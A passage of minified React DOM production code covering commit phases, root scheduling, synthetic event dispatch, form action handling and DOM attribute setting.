				(ra = t),
				(ne = l),
				(oa = e),
				(bi = n),
				(pi = u),
				($r = a),
				(t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0
					? ((l.callbackNode = null),
					  (l.callbackPriority = 0),
					  Z0(pu, function () {
							return oo(), null;
					  }))
					: ((l.callbackNode = null), (l.callbackPriority = 0)),
				(a = (t.flags & 13878) !== 0),
				(t.subtreeFlags & 13878) !== 0 || a)
			) {
				(a = b.T),
					(b.T = null),
					(u = A.p),
					(A.p = 2),
					(c = al),
					(al |= 4);
				try {
					U0(l, t, e);
				} finally {
					(al = c), (A.p = u), (b.T = a);
				}
			}
			(Dl = 1), io(), fo(), so();
		}
	}
	function io() {
		if (Dl === 1) {
			Dl = 0;
			var l = ne,
				t = ra,
				e = (t.flags & 13878) !== 0;
			if ((t.subtreeFlags & 13878) !== 0 || e) {
				(e = b.T), (b.T = null);
				var a = A.p;
				A.p = 2;
				var u = al;
				al |= 4;
				try {
					Lr(t, l);
					var n = Bi,
						c = Wf(l.containerInfo),
						i = n.focusedElem,
						s = n.selectionRange;
					if (
						c !== i &&
						i &&
						i.ownerDocument &&
						kf(i.ownerDocument.documentElement, i)
					) {
						if (s !== null && sc(i)) {
							var v = s.start,
								x = s.end;
							if (
								(x === void 0 && (x = v), "selectionStart" in i)
							)
								(i.selectionStart = v),
									(i.selectionEnd = Math.min(
										x,
										i.value.length
									));
							else {
								var S = i.ownerDocument || document,
									y = (S && S.defaultView) || window;
								if (y.getSelection) {
									var g = y.getSelection(),
										Y = i.textContent.length,
										H = Math.min(s.start, Y),
										il =
											s.end === void 0
												? H
												: Math.min(s.end, Y);
									!g.extend &&
										H > il &&
										((c = il), (il = H), (H = c));
									var d = Jf(i, H),
										o = Jf(i, il);
									if (
										d &&
										o &&
										(g.rangeCount !== 1 ||
											g.anchorNode !== d.node ||
											g.anchorOffset !== d.offset ||
											g.focusNode !== o.node ||
											g.focusOffset !== o.offset)
									) {
										var m = S.createRange();
										m.setStart(d.node, d.offset),
											g.removeAllRanges(),
											H > il
												? (g.addRange(m),
												  g.extend(o.node, o.offset))
												: (m.setEnd(o.node, o.offset),
												  g.addRange(m));
									}
								}
							}
						}
						for (S = [], g = i; (g = g.parentNode); )
							g.nodeType === 1 &&
								S.push({
									element: g,
									left: g.scrollLeft,
									top: g.scrollTop,
								});
						for (
							typeof i.focus == "function" && i.focus(), i = 0;
							i < S.length;
							i++
						) {
							var p = S[i];
							(p.element.scrollLeft = p.left),
								(p.element.scrollTop = p.top);
						}
					}
					(Mn = !!Ci), (Bi = Ci = null);
				} finally {
					(al = u), (A.p = a), (b.T = e);
				}
			}
			(l.current = t), (Dl = 2);
		}
	}
	function fo() {
		if (Dl === 2) {
			Dl = 0;
			var l = ne,
				t = ra,
				e = (t.flags & 8772) !== 0;
			if ((t.subtreeFlags & 8772) !== 0 || e) {
				(e = b.T), (b.T = null);
				var a = A.p;
				A.p = 2;
				var u = al;
				al |= 4;
				try {
					Yr(l, t.alternate, t);
				} finally {
					(al = u), (A.p = a), (b.T = e);
				}
			}
			Dl = 3;
		}
	}
	function so() {
		if (Dl === 4 || Dl === 3) {
			(Dl = 0), sd();
			var l = ne,
				t = ra,
				e = oa,
				a = $r;
			(t.subtreeFlags & 10256) !== 0 || (t.flags & 10256) !== 0
				? (Dl = 5)
				: ((Dl = 0), (ra = ne = null), ro(l, l.pendingLanes));
			var u = l.pendingLanes;
			if (
				(u === 0 && (ue = null),
				Qn(e),
				(t = t.stateNode),
				$l && typeof $l.onCommitFiberRoot == "function")
			)
				try {
					$l.onCommitFiberRoot(
						ba,
						t,
						void 0,
						(t.current.flags & 128) === 128
					);
				} catch {}
			if (a !== null) {
				(t = b.T), (u = A.p), (A.p = 2), (b.T = null);
				try {
					for (
						var n = l.onRecoverableError, c = 0;
						c < a.length;
						c++
					) {
						var i = a[c];
						n(i.value, { componentStack: i.stack });
					}
				} finally {
					(b.T = t), (A.p = u);
				}
			}
			(oa & 3) !== 0 && yn(),
				jt(l),
				(u = l.pendingLanes),
				(e & 4194090) !== 0 && (u & 42) !== 0
					? l === Si
						? au++
						: ((au = 0), (Si = l))
					: (au = 0),
				uu(0);
		}
	}
	function ro(l, t) {
		(l.pooledCacheLanes &= t) === 0 &&
			((t = l.pooledCache), t != null && ((l.pooledCache = null), qa(t)));
	}
	function yn(l) {
		return io(), fo(), so(), oo();
	}
	function oo() {
		if (Dl !== 5) return !1;
		var l = ne,
			t = bi;
		bi = 0;
		var e = Qn(oa),
			a = b.T,
			u = A.p;
		try {
			(A.p = 32 > e ? 32 : e), (b.T = null), (e = pi), (pi = null);
			var n = ne,
				c = oa;
			if (((Dl = 0), (ra = ne = null), (oa = 0), (al & 6) !== 0))
				throw Error(h(331));
			var i = al;
			if (
				((al |= 4),
				kr(n.current),
				Vr(n, n.current, c, e),
				(al = i),
				uu(0, !1),
				$l && typeof $l.onPostCommitFiberRoot == "function")
			)
				try {
					$l.onPostCommitFiberRoot(ba, n);
				} catch {}
			return !0;
		} finally {
			(A.p = u), (b.T = a), ro(l, t);
		}
	}
	function ho(l, t, e) {
		(t = it(e, t)),
			(t = Pc(l.stateNode, t, 2)),
			(l = Wt(l, t, 2)),
			l !== null && (Sa(l, 2), jt(l));
	}
	function sl(l, t, e) {
		if (l.tag === 3) ho(l, l, e);
		else
			for (; t !== null; ) {
				if (t.tag === 3) {
					ho(t, l, e);
					break;
				} else if (t.tag === 1) {
					var a = t.stateNode;
					if (
						typeof t.type.getDerivedStateFromError == "function" ||
						(typeof a.componentDidCatch == "function" &&
							(ue === null || !ue.has(a)))
					) {
						(l = it(e, l)),
							(e = yr(2)),
							(a = Wt(t, e, 2)),
							a !== null && (gr(e, a, t, l), Sa(a, 2), jt(a));
						break;
					}
				}
				t = t.return;
			}
	}
	function ji(l, t, e) {
		var a = l.pingCache;
		if (a === null) {
			a = l.pingCache = new B0();
			var u = new Set();
			a.set(t, u);
		} else (u = a.get(t)), u === void 0 && ((u = new Set()), a.set(t, u));
		u.has(e) ||
			((vi = !0), u.add(e), (l = X0.bind(null, l, t, e)), t.then(l, l));
	}
	function X0(l, t, e) {
		var a = l.pingCache;
		a !== null && a.delete(t),
			(l.pingedLanes |= l.suspendedLanes & e),
			(l.warmLanes &= ~e),
			ol === l &&
				(k & e) === e &&
				(xl === 4 ||
				(xl === 3 && (k & 62914560) === k && 300 > pt() - xi)
					? (al & 2) === 0 && da(l, 0)
					: (yi |= e),
				sa === k && (sa = 0)),
			jt(l);
	}
	function mo(l, t) {
		t === 0 && (t = sf()), (l = ke(l, t)), l !== null && (Sa(l, t), jt(l));
	}
	function Q0(l) {
		var t = l.memoizedState,
			e = 0;
		t !== null && (e = t.retryLane), mo(l, e);
	}
	function L0(l, t) {
		var e = 0;
		switch (l.tag) {
			case 13:
				var a = l.stateNode,
					u = l.memoizedState;
				u !== null && (e = u.retryLane);
				break;
			case 19:
				a = l.stateNode;
				break;
			case 22:
				a = l.stateNode._retryCache;
				break;
			default:
				throw Error(h(314));
		}
		a !== null && a.delete(t), mo(l, e);
	}
	function Z0(l, t) {
		return wn(l, t);
	}
	var gn = null,
		ma = null,
		zi = !1,
		xn = !1,
		Ai = !1,
		Re = 0;
	function jt(l) {
		l !== ma &&
			l.next === null &&
			(ma === null ? (gn = ma = l) : (ma = ma.next = l)),
			(xn = !0),
			zi || ((zi = !0), K0());
	}
	function uu(l, t) {
		if (!Ai && xn) {
			Ai = !0;
			do
				for (var e = !1, a = gn; a !== null; ) {
					if (l !== 0) {
						var u = a.pendingLanes;
						if (u === 0) var n = 0;
						else {
							var c = a.suspendedLanes,
								i = a.pingedLanes;
							(n = (1 << (31 - Fl(42 | l) + 1)) - 1),
								(n &= u & ~(c & ~i)),
								(n =
									n & 201326741
										? (n & 201326741) | 1
										: n
										? n | 2
										: 0);
						}
						n !== 0 && ((e = !0), xo(a, n));
					} else
						(n = k),
							(n = Eu(
								a,
								a === ol ? n : 0,
								a.cancelPendingCommit !== null ||
									a.timeoutHandle !== -1
							)),
							(n & 3) === 0 || pa(a, n) || ((e = !0), xo(a, n));
					a = a.next;
				}
			while (e);
			Ai = !1;
		}
	}
	function V0() {
		vo();
	}
	function vo() {
		xn = zi = !1;
		var l = 0;
		Re !== 0 && (lh() && (l = Re), (Re = 0));
		for (var t = pt(), e = null, a = gn; a !== null; ) {
			var u = a.next,
				n = yo(a, t);
			n === 0
				? ((a.next = null),
				  e === null ? (gn = u) : (e.next = u),
				  u === null && (ma = e))
				: ((e = a), (l !== 0 || (n & 3) !== 0) && (xn = !0)),
				(a = u);
		}
		uu(l);
	}
	function yo(l, t) {
		for (
			var e = l.suspendedLanes,
				a = l.pingedLanes,
				u = l.expirationTimes,
				n = l.pendingLanes & -62914561;
			0 < n;

		) {
			var c = 31 - Fl(n),
				i = 1 << c,
				s = u[c];
			s === -1
				? ((i & e) === 0 || (i & a) !== 0) && (u[c] = gd(i, t))
				: s <= t && (l.expiredLanes |= i),
				(n &= ~i);
		}
		if (
			((t = ol),
			(e = k),
			(e = Eu(
				l,
				l === t ? e : 0,
				l.cancelPendingCommit !== null || l.timeoutHandle !== -1
			)),
			(a = l.callbackNode),
			e === 0 ||
				(l === t && (ul === 2 || ul === 9)) ||
				l.cancelPendingCommit !== null)
		)
			return (
				a !== null && a !== null && Yn(a),
				(l.callbackNode = null),
				(l.callbackPriority = 0)
			);
		if ((e & 3) === 0 || pa(l, e)) {
			if (((t = e & -e), t === l.callbackPriority)) return t;
			switch ((a !== null && Yn(a), Qn(e))) {
				case 2:
				case 8:
					e = nf;
					break;
				case 32:
					e = pu;
					break;
				case 268435456:
					e = cf;
					break;
				default:
					e = pu;
			}
			return (
				(a = go.bind(null, l)),
				(e = wn(e, a)),
				(l.callbackPriority = t),
				(l.callbackNode = e),
				t
			);
		}
		return (
			a !== null && a !== null && Yn(a),
			(l.callbackPriority = 2),
			(l.callbackNode = null),
			2
		);
	}
	function go(l, t) {
		if (Dl !== 0 && Dl !== 5)
			return (l.callbackNode = null), (l.callbackPriority = 0), null;
		var e = l.callbackNode;
		if (yn() && l.callbackNode !== e) return null;
		var a = k;
		return (
			(a = Eu(
				l,
				l === ol ? a : 0,
				l.cancelPendingCommit !== null || l.timeoutHandle !== -1
			)),
			a === 0
				? null
				: (Ir(l, a, t),
				  yo(l, pt()),
				  l.callbackNode != null && l.callbackNode === e
						? go.bind(null, l)
						: null)
		);
	}
	function xo(l, t) {
		if (yn()) return null;
		Ir(l, t, !0);
	}
	function K0() {
		eh(function () {
			(al & 6) !== 0 ? wn(uf, V0) : vo();
		});
	}
	function Mi() {
		return Re === 0 && (Re = ff()), Re;
	}
	function bo(l) {
		return l == null || typeof l == "symbol" || typeof l == "boolean"
			? null
			: typeof l == "function"
			? l
			: Mu("" + l);
	}
	function po(l, t) {
		var e = t.ownerDocument.createElement("input");
		return (
			(e.name = t.name),
			(e.value = t.value),
			l.id && e.setAttribute("form", l.id),
			t.parentNode.insertBefore(e, t),
			(l = new FormData(l)),
			e.parentNode.removeChild(e),
			l
		);
	}
	function J0(l, t, e, a, u) {
		if (t === "submit" && e && e.stateNode === u) {
			var n = bo((u[Gl] || null).action),
				c = a.submitter;
			c &&
				((t = (t = c[Gl] || null)
					? bo(t.formAction)
					: c.getAttribute("formAction")),
				t !== null && ((n = t), (c = null)));
			var i = new Ru("action", "action", null, a, u);
			l.push({
				event: i,
				listeners: [
					{
						instance: null,
						listener: function () {
							if (a.defaultPrevented) {
								if (Re !== 0) {
									var s = c ? po(u, c) : new FormData(u);
									kc(
										e,
										{
											pending: !0,
											data: s,
											method: u.method,
											action: n,
										},
										null,
										s
									);
								}
							} else
								typeof n == "function" &&
									(i.preventDefault(),
									(s = c ? po(u, c) : new FormData(u)),
									kc(
										e,
										{
											pending: !0,
											data: s,
											method: u.method,
											action: n,
										},
										n,
										s
									));
						},
						currentTarget: u,
					},
				],
			});
		}
	}
	for (var Oi = 0; Oi < hc.length; Oi++) {
		var _i = hc[Oi],
			k0 = _i.toLowerCase(),
			W0 = _i[0].toUpperCase() + _i.slice(1);
		vt(k0, "on" + W0);
	}
	vt(If, "onAnimationEnd"),
		vt(Pf, "onAnimationIteration"),
		vt(ls, "onAnimationStart"),
		vt("dblclick", "onDoubleClick"),
		vt("focusin", "onFocus"),
		vt("focusout", "onBlur"),
		vt(d0, "onTransitionRun"),
		vt(h0, "onTransitionStart"),
		vt(m0, "onTransitionCancel"),
		vt(ts, "onTransitionEnd"),
		we("onMouseEnter", ["mouseout", "mouseover"]),
		we("onMouseLeave", ["mouseout", "mouseover"]),
		we("onPointerEnter", ["pointerout", "pointerover"]),
		we("onPointerLeave", ["pointerout", "pointerover"]),
		ye(
			"onChange",
			"change click focusin focusout input keydown keyup selectionchange".split(
				" "
			)
		),
		ye(
			"onSelect",
			"focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(
				" "
			)
		),
		ye("onBeforeInput", [
			"compositionend",
			"keypress",
			"textInput",
			"paste",
		]),
		ye(
			"onCompositionEnd",
			"compositionend focusout keydown keypress keyup mousedown".split(
				" "
			)
		),
		ye(
			"onCompositionStart",
			"compositionstart focusout keydown keypress keyup mousedown".split(
				" "
			)
		),
		ye(
			"onCompositionUpdate",
			"compositionupdate focusout keydown keypress keyup mousedown".split(
				" "
			)
		);
	var nu =
			"abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(
				" "
			),
		$0 = new Set(
			"beforetoggle cancel close invalid load scroll scrollend toggle"
				.split(" ")
				.concat(nu)
		);
	function So(l, t) {
		t = (t & 4) !== 0;
		for (var e = 0; e < l.length; e++) {
			var a = l[e],
				u = a.event;
			a = a.listeners;
			l: {
				var n = void 0;
				if (t)
					for (var c = a.length - 1; 0 <= c; c--) {
						var i = a[c],
							s = i.instance,
							v = i.currentTarget;
						if (
							((i = i.listener),
							s !== n && u.isPropagationStopped())
						)
							break l;
						(n = i), (u.currentTarget = v);
						try {
							n(u);
						} catch (x) {
							un(x);
						}
						(u.currentTarget = null), (n = s);
					}
				else
					for (c = 0; c < a.length; c++) {
						if (
							((i = a[c]),
							(s = i.instance),
							(v = i.currentTarget),
							(i = i.listener),
							s !== n && u.isPropagationStopped())
						)
							break l;
						(n = i), (u.currentTarget = v);
						try {
							n(u);
						} catch (x) {
							un(x);
						}
						(u.currentTarget = null), (n = s);
					}
			}
		}
	}
	function K(l, t) {
		var e = t[Ln];
		e === void 0 && (e = t[Ln] = new Set());
		var a = l + "__bubble";
		e.has(a) || (To(t, l, 2, !1), e.add(a));
	}
	function Di(l, t, e) {
		var a = 0;
		t && (a |= 4), To(e, l, a, t);
	}
	var bn = "_reactListening" + Math.random().toString(36).slice(2);
	function Ri(l) {
		if (!l[bn]) {
			(l[bn] = !0),
				mf.forEach(function (e) {
					e !== "selectionchange" &&
						($0.has(e) || Di(e, !1, l), Di(e, !0, l));
				});
			var t = l.nodeType === 9 ? l : l.ownerDocument;
			t === null || t[bn] || ((t[bn] = !0), Di("selectionchange", !1, t));
		}
	}
	function To(l, t, e, a) {
		switch (Ko(t)) {
			case 2:
				var u = Eh;
				break;
			case 8:
				u = Nh;
				break;
			default:
				u = Ki;
		}
		(e = u.bind(null, t, e, l)),
			(u = void 0),
			!lc ||
				(t !== "touchstart" && t !== "touchmove" && t !== "wheel") ||
				(u = !0),
			a
				? u !== void 0
					? l.addEventListener(t, e, { capture: !0, passive: u })
					: l.addEventListener(t, e, !0)
				: u !== void 0
				? l.addEventListener(t, e, { passive: u })
				: l.addEventListener(t, e, !1);
	}
	function Ui(l, t, e, a, u) {
		var n = a;
		if ((t & 1) === 0 && (t & 2) === 0 && a !== null)
			l: for (;;) {
				if (a === null) return;
				var c = a.tag;
				if (c === 3 || c === 4) {
					var i = a.stateNode.containerInfo;
					if (i === u) break;
					if (c === 4)
						for (c = a.return; c !== null; ) {
							var s = c.tag;
							if (
								(s === 3 || s === 4) &&
								c.stateNode.containerInfo === u
							)
								return;
							c = c.return;
						}
					for (; i !== null; ) {
						if (((c = Ce(i)), c === null)) return;
						if (
							((s = c.tag),
							s === 5 || s === 6 || s === 26 || s === 27)
						) {
							a = n = c;
							continue l;
						}
						i = i.parentNode;
					}
				}
				a = a.return;
			}
		Mf(function () {
			var v = n,
				x = In(e),
				S = [];
			l: {
				var y = es.get(l);
				if (y !== void 0) {
					var g = Ru,
						Y = l;
					switch (l) {
						case "keypress":
							if (_u(e) === 0) break l;
						case "keydown":
						case "keyup":
							g = Zd;
							break;
						case "focusin":
							(Y = "focus"), (g = uc);
							break;
						case "focusout":
							(Y = "blur"), (g = uc);
							break;
						case "beforeblur":
						case "afterblur":
							g = uc;
							break;
						case "click":
							if (e.button === 2) break l;
						case "auxclick":
						case "dblclick":
						case "mousedown":
						case "mousemove":
						case "mouseup":
						case "mouseout":
						case "mouseover":
						case "contextmenu":
							g = Df;
							break;
						case "drag":
						case "dragend":
						case "dragenter":
						case "dragexit":
						case "dragleave":
						case "dragover":
						case "dragstart":
						case "drop":
							g = Rd;
							break;
						case "touchcancel":
						case "touchend":
						case "touchmove":
						case "touchstart":
							g = Jd;
							break;
						case If:
						case Pf:
						case ls:
							g = Cd;
							break;
						case ts:
							g = Wd;
							break;
						case "scroll":
						case "scrollend":
							g = _d;
							break;
						case "wheel":
							g = Fd;
							break;
						case "copy":
						case "cut":
						case "paste":
							g = qd;
							break;
						case "gotpointercapture":
						case "lostpointercapture":
						case "pointercancel":
						case "pointerdown":
						case "pointermove":
						case "pointerout":
						case "pointerover":
						case "pointerup":
							g = Uf;
							break;
						case "toggle":
						case "beforetoggle":
							g = Pd;
					}
					var H = (t & 4) !== 0,
						il = !H && (l === "scroll" || l === "scrollend"),
						d = H ? (y !== null ? y + "Capture" : null) : y;
					H = [];
					for (var o = v, m; o !== null; ) {
						var p = o;
						if (
							((m = p.stateNode),
							(p = p.tag),
							(p !== 5 && p !== 26 && p !== 27) ||
								m === null ||
								d === null ||
								((p = Na(o, d)),
								p != null && H.push(cu(o, p, m))),
							il)
						)
							break;
						o = o.return;
					}
					0 < H.length &&
						((y = new g(y, Y, null, e, x)),
						S.push({ event: y, listeners: H }));
				}
			}
			if ((t & 7) === 0) {
				l: {
					if (
						((y = l === "mouseover" || l === "pointerover"),
						(g = l === "mouseout" || l === "pointerout"),
						y &&
							e !== Fn &&
							(Y = e.relatedTarget || e.fromElement) &&
							(Ce(Y) || Y[He]))
					)
						break l;
					if (
						(g || y) &&
						((y =
							x.window === x
								? x
								: (y = x.ownerDocument)
								? y.defaultView || y.parentWindow
								: window),
						g
							? ((Y = e.relatedTarget || e.toElement),
							  (g = v),
							  (Y = Y ? Ce(Y) : null),
							  Y !== null &&
									((il = G(Y)),
									(H = Y.tag),
									Y !== il ||
										(H !== 5 && H !== 27 && H !== 6)) &&
									(Y = null))
							: ((g = null), (Y = v)),
						g !== Y)
					) {
						if (
							((H = Df),
							(p = "onMouseLeave"),
							(d = "onMouseEnter"),
							(o = "mouse"),
							(l === "pointerout" || l === "pointerover") &&
								((H = Uf),
								(p = "onPointerLeave"),
								(d = "onPointerEnter"),
								(o = "pointer")),
							(il = g == null ? y : Ea(g)),
							(m = Y == null ? y : Ea(Y)),
							(y = new H(p, o + "leave", g, e, x)),
							(y.target = il),
							(y.relatedTarget = m),
							(p = null),
							Ce(x) === v &&
								((H = new H(d, o + "enter", Y, e, x)),
								(H.target = m),
								(H.relatedTarget = il),
								(p = H)),
							(il = p),
							g && Y)
						)
							t: {
								for (H = g, d = Y, o = 0, m = H; m; m = va(m))
									o++;
								for (m = 0, p = d; p; p = va(p)) m++;
								for (; 0 < o - m; ) (H = va(H)), o--;
								for (; 0 < m - o; ) (d = va(d)), m--;
								for (; o--; ) {
									if (
										H === d ||
										(d !== null && H === d.alternate)
									)
										break t;
									(H = va(H)), (d = va(d));
								}
								H = null;
							}
						else H = null;
						g !== null && Eo(S, y, g, H, !1),
							Y !== null && il !== null && Eo(S, il, Y, H, !0);
					}
				}
				l: {
					if (
						((y = v ? Ea(v) : window),
						(g = y.nodeName && y.nodeName.toLowerCase()),
						g === "select" || (g === "input" && y.type === "file"))
					)
						var O = Xf;
					else if (Yf(y))
						if (Qf) O = s0;
						else {
							O = i0;
							var Z = c0;
						}
					else
						(g = y.nodeName),
							!g ||
							g.toLowerCase() !== "input" ||
							(y.type !== "checkbox" && y.type !== "radio")
								? v && $n(v.elementType) && (O = Xf)
								: (O = f0);
					if (O && (O = O(l, v))) {
						Gf(S, O, e, x);
						break l;
					}
					Z && Z(l, y, v),
						l === "focusout" &&
							v &&
							y.type === "number" &&
							v.memoizedProps.value != null &&
							Wn(y, "number", y.value);
				}
				switch (((Z = v ? Ea(v) : window), l)) {
					case "focusin":
						(Yf(Z) || Z.contentEditable === "true") &&
							((Ve = Z), (rc = v), (Ra = null));
						break;
					case "focusout":
						Ra = rc = Ve = null;
						break;
					case "mousedown":
						oc = !0;
						break;
					case "contextmenu":
					case "mouseup":
					case "dragend":
						(oc = !1), $f(S, e, x);
						break;
					case "selectionchange":
						if (o0) break;
					case "keydown":
					case "keyup":
						$f(S, e, x);
				}
				var R;
				if (cc)
					l: {
						switch (l) {
							case "compositionstart":
								var B = "onCompositionStart";
								break l;
							case "compositionend":
								B = "onCompositionEnd";
								break l;
							case "compositionupdate":
								B = "onCompositionUpdate";
								break l;
						}
						B = void 0;
					}
				else
					Ze
						? qf(l, e) && (B = "onCompositionEnd")
						: l === "keydown" &&
						  e.keyCode === 229 &&
						  (B = "onCompositionStart");
				B &&
					(Hf &&
						e.locale !== "ko" &&
						(Ze || B !== "onCompositionStart"
							? B === "onCompositionEnd" && Ze && (R = Of())
							: ((Vt = x),
							  (tc = "value" in Vt ? Vt.value : Vt.textContent),
							  (Ze = !0))),
					(Z = pn(v, B)),
					0 < Z.length &&
						((B = new Rf(B, l, null, e, x)),
						S.push({ event: B, listeners: Z }),
						R
							? (B.data = R)
							: ((R = wf(e)), R !== null && (B.data = R)))),
					(R = t0 ? e0(l, e) : a0(l, e)) &&
						((B = pn(v, "onBeforeInput")),
						0 < B.length &&
							((Z = new Rf(
								"onBeforeInput",
								"beforeinput",
								null,
								e,
								x
							)),
							S.push({ event: Z, listeners: B }),
							(Z.data = R))),
					J0(S, l, v, e, x);
			}
			So(S, t);
		});
	}
	function cu(l, t, e) {
		return { instance: l, listener: t, currentTarget: e };
	}
	function pn(l, t) {
		for (var e = t + "Capture", a = []; l !== null; ) {
			var u = l,
				n = u.stateNode;
			if (
				((u = u.tag),
				(u !== 5 && u !== 26 && u !== 27) ||
					n === null ||
					((u = Na(l, e)),
					u != null && a.unshift(cu(l, u, n)),
					(u = Na(l, t)),
					u != null && a.push(cu(l, u, n))),
				l.tag === 3)
			)
				return a;
			l = l.return;
		}
		return [];
	}
	function va(l) {
		if (l === null) return null;
		do l = l.return;
		while (l && l.tag !== 5 && l.tag !== 27);
		return l || null;
	}
	function Eo(l, t, e, a, u) {
		for (var n = t._reactName, c = []; e !== null && e !== a; ) {
			var i = e,
				s = i.alternate,
				v = i.stateNode;
			if (((i = i.tag), s !== null && s === a)) break;
			(i !== 5 && i !== 26 && i !== 27) ||
				v === null ||
				((s = v),
				u
					? ((v = Na(e, n)), v != null && c.unshift(cu(e, v, s)))
					: u || ((v = Na(e, n)), v != null && c.push(cu(e, v, s)))),
				(e = e.return);
		}
		c.length !== 0 && l.push({ event: t, listeners: c });
	}
	var F0 = /\r\n?/g,
		I0 = /\u0000|\uFFFD/g;
	function No(l) {
		return (typeof l == "string" ? l : "" + l)
			.replace(
				F0,
				`
`
			)
			.replace(I0, "");
	}
	function jo(l, t) {
		return (t = No(t)), No(l) === t;
	}
	function Sn() {}
	function cl(l, t, e, a, u, n) {
		switch (e) {
			case "children":
				typeof a == "string"
					? t === "body" || (t === "textarea" && a === "") || Xe(l, a)
					: (typeof a == "number" || typeof a == "bigint") &&
					  t !== "body" &&
					  Xe(l, "" + a);
				break;
			case "className":
				ju(l, "class", a);
				break;
			case "tabIndex":
				ju(l, "tabindex", a);
				break;
			case "dir":
			case "role":
			case "viewBox":
			case "width":
			case "height":
				ju(l, e, a);
				break;
			case "style":
				zf(l, a, n);
				break;
			case "data":
				if (t !== "object") {
					ju(l, "data", a);
					break;
				}
			case "src":
			case "href":
				if (a === "" && (t !== "a" || e !== "href")) {
					l.removeAttribute(e);
					break;
				}
				if (
					a == null ||
					typeof a == "function" ||
					typeof a == "symbol" ||
					typeof a == "boolean"
				) {
					l.removeAttribute(e);
					break;
				}
				(a = Mu("" + a)), l.setAttribute(e, a);
				break;
			case "action":
			case "formAction":
				if (typeof a == "function") {
					l.setAttribute(
						e,
						"javascript:throw new Error('A React form was unexpectedly submitted. If you called form.submit() manually, consider using form.requestSubmit() instead. If you\\'re trying to use event.stopPropagation() in a submit event handler, consider also calling event.preventDefault().')"
					);
					break;
				} else
					typeof n == "function" &&
						(e === "formAction"
							? (t !== "input" &&
									cl(l, t, "name", u.name, u, null),
							  cl(l, t, "formEncType", u.formEncType, u, null),
							  cl(l, t, "formMethod", u.formMethod, u, null),
							  cl(l, t, "formTarget", u.formTarget, u, null))
							: (cl(l, t, "encType", u.encType, u, null),
							  cl(l, t, "method", u.method, u, null),
							  cl(l, t, "target", u.target, u, null)));
				if (
					a == null ||
					typeof a == "symbol" ||
					typeof a == "boolean"
				) {
					l.removeAttribute(e);
					break;
				}
				(a = Mu("" + a)), l.setAttribute(e, a);
				break;
			case "onClick":
				a != null && (l.onclick = Sn);
				break;
			case "onScroll":
				a != null && K("scroll", l);
				break;
			case "onScrollEnd":
				a != null && K("scrollend", l);
				break;
			case "dangerouslySetInnerHTML":
				if (a != null) {
					if (typeof a != "object" || !("__html" in a))
						throw Error(h(61));
					if (((e = a.__html), e != null)) {
						if (u.children != null) throw Error(h(60));
						l.innerHTML = e;
					}
				}
				break;
			case "multiple":
				l.multiple =
					a && typeof a != "function" && typeof a != "symbol";
				break;
			case "muted":
				l.muted = a && typeof a != "function" && typeof a != "symbol";
				break;
			case "suppressContentEditableWarning":
			case "suppressHydrationWarning":
			case "defaultValue":
			case "defaultChecked":
			case "innerHTML":
			case "ref":
				break;
			case "autoFocus":
				break;
			case "xlinkHref":
				if (
					a == null ||
					typeof a == "function" ||
					typeof a == "boolean" ||
					typeof a == "symbol"
				) {
					l.removeAttribute("xlink:href");
					break;
				}
				(e = Mu("" + a)),
					l.setAttributeNS(
						"http://www.w3.org/1999/xlink",
						"xlink:href",
						e
					);
				break;
			case "contentEditable":
			case "spellCheck":
			case "draggable":
			case "value":
			case "autoReverse":
			case "externalResourcesRequired":
			case "focusable":
			case "preserveAlpha":
				a != null && typeof a != "function" && typeof a != "symbol"
					? l.setAttribute(e, "" + a)
					: l.removeAttribute(e);
				break;
			case "inert":
			case "allowFullScreen":
			case "async":
			case "autoPlay":
			case "controls":
			case "default":
			case "defer":
			case "disabled":
			case "disablePictureInPicture":
			case "disableRemotePlayback":
			case "formNoValidate":
			case "hidden":
			case "loop":
			case "noModule":
			case "noValidate":
			case "open":
			case "playsInline":
			case "readOnly":
			case "required":
			case "reversed":
			case "scoped":
			case "seamless":
			case "itemScope":
				a && typeof a != "function" && typeof a != "symbol"
					? l.setAttribute(e, "")
					: l.removeAttribute(e);
				break;
			case "capture":
			case "download":
				a === !0
					? l.setAttribute(e, "")
					: a !== !1 &&
					  a != null &&
					  typeof a != "function" &&
					  typeof a != "symbol"
					? l.setAttribute(e, a)
					: l.removeAttribute(e);
				break;
			case "cols":
			case "rows":
			case "size":
			case "span":
				a != null &&
				typeof a != "function" &&
				typeof a != "symbol" &&
				!isNaN(a) &&
				1 <= a
					? l.setAttribute(e, a)
					: l.removeAttribute(e);
				break;
			case "rowSpan":
			case "start":
				a == null ||
				typeof a == "function" ||
				typeof a == "symbol" ||
				isNaN(a)
					? l.removeAttribute(e)
					: l.setAttribute(e, a);
				break;
			case "popover":
				K("beforetoggle", l), K("toggle", l), Nu(l, "popover", a);
				break;
			case "xlinkActuate":
				At(l, "http://www.w3.org/1999/xlink", "xlink:actuate", a);
				break;
			case "xlinkArcrole":
				At(l, "http://www.w3.org/1999/xlink", "xlink:arcrole", a);
				break;
			case "xlinkRole":
				At(l, "http://www.w3.org/1999/xlink", "xlink:role", a);
				break;
			case "xlinkShow":
				At(l, "http://www.w3.org/1999/xlink", "xlink:show", a);
				break;
			case "xlinkTitle":
				At(l, "http://www.w3.org/1999/xlink", "xlink:title", a);
				break;
			case "xlinkType":
				At(l, "http://www.w3.org/1999/xlink", "xlink:type", a);
				break;
			case "xmlBase":
				At(l, "http://www.w3.org/XML/1998/namespace", "xml:base", a);
				break;
			case "xmlLang":
				At(l, "http://www.w3.org/XML/1998/namespace", "xml:lang", a);
				break;
			case "xmlSpace":
				At(l, "http://www.w3.org/XML/1998/namespace", "xml:space", a);
				break;
			case "is":
				Nu(l, "is", a);
				break;
			case "innerText":
			case "textContent":
				break;
			default:
				(!(2 < e.length) ||
					(e[0] !== "o" && e[0] !== "O") ||
					(e[1] !== "n" && e[1] !== "N")) &&
					((e = Md.get(e) || e), Nu(l, e, a));
		}
	}
	function Hi(l, t, e, a, u, n) {
		switch (e) {
			case "style":
				zf(l, a, n);
				break;
			case "dangerouslySetInnerHTML":
				if (a != null) {
					if (typeof a != "object" || !("__html" in a))
						throw Error(h(61));
					if (((e = a.__html), e != null)) {
						if (u.children != null) throw Error(h(60));
						l.innerHTML = e;
					}
				}
				break;
			case "children":
				typeof a == "string"
					? Xe(l, a)
					: (typeof a == "number" || typeof a == "bigint") &&
					  Xe(l, "" + a);
				break;
			case "onScroll":
